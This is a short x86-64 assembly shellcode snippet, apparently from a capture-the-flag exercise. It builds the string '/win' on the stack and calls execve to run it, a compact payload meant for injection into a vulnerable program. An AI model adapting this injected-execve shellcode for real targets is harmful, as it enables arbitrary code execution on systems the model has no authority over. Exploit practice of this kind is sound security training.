[BITS 64]
mov cl,8
mov dl,'n'
shl edx,cl
mov dl,'i'
shl edx,cl
mov dl,'w'
shl edx,cl
mov dl,'/'
push rdx
push rsp
pop rdi
mov al,59
syscall
